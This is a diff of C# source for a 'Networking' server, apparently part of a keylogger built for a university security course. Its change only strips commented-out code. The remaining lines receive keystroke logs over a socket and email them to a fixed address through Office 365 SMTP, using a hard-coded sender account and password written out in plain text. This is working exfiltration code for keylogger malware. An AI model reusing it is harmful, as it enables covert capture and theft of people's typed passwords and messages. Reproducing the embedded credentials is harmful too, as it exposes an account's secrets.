@@ -11,7 +11,6 @@ namespace Networking
         private const string FROM_EMAIL_ADDRESS = "cmsc414dummy@outlook.com";
         private const string FROM_EMAIL_PASSWORD = "414dummy";
         private const string TO_EMAIL_ADDRESS = "smithcl6@vcu.edu";
-       // private static string LOG_FILE_NAME = @"C:\ProgramData"+ DateTime.Now +".txt";
         private const string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
         private const bool INCLUDE_LOG_AS_ATTACHMENT = true;
         private const int MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL = 300;
@@ -34,12 +33,6 @@ namespace Networking
                 Console.WriteLine("Message Received:" + log);
                 sendMail(log);
 
-                // // specify the file path and name
-                // // create a new file
-                // using (FileStream fs = File.Create(filePath))
-                // {
-                    
-                // }
                 DateTime now = DateTime.Now;
                 string formattedDateTime = now.ToString("yyyy-MM-dd-HH-mm-ss");
 
@@ -58,35 +51,7 @@ namespace Networking
                 output.Close();
 
                 connectionSocket.Close();  // Close connection with client
-                // Environment.Exit(0);
             }
-
-
-            //     FileInfo logFile = new FileInfo(@"C:\ProgramData\mylog.txt");
-
-            // // Archive and email the log file if the max size has been reached
-            // if (logFile.Exists && logFile.Length >= MAX_LOG_LENGTH_BEFORE_SENDING_EMAIL)
-            // {
-            //     try
-            //     {
-            //         // Copy the log file to the archive
-            //         logFile.CopyTo(ARCHIVE_FILE_NAME, true);
-
-            //         // Delete the log file
-            //         logFile.Delete();
-
-            //         // Email the archive and send email using a new thread
-            //         System.Threading.Thread mailThread = new System.Threading.Thread(Program.sendMail);
-            //         Console.Out.WriteLine("\n\n**MAILSENDING**\n");
-            //         mailThread.Start();
-            //     }
-            //     catch(Exception e)
-            //     {
-            //         Console.Out.WriteLine(e.Message);
-            //     }
-
-            // }
-
         }
 
         // Sends email based off incoming keylogs to the specified email address
@@ -94,11 +59,6 @@ namespace Networking
         {
             try
             {
-                // Read the archive file contents into the email body variable
-                // StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
-                // string emailBody = input.ReadToEnd();
-                // input.Close();
-
                 // Create the email client object
                 SmtpClient client = new SmtpClient("smtp.office365.com")
                 {
@@ -117,12 +77,6 @@ namespace Networking
                     Body = log,
                     IsBodyHtml = false,
                 };
-
-                // if (INCLUDE_LOG_AS_ATTACHMENT)
-                // {
-                //     Attachment attachment = new Attachment(@"C:\ProgramData\mylog_archive.txt", System.Net.Mime.MediaTypeNames.Text.Plain);
-                //     message.Attachments.Add(attachment);
-                // }
 
                 // Set the recipient
                 message.To.Add(TO_EMAIL_ADDRESS);
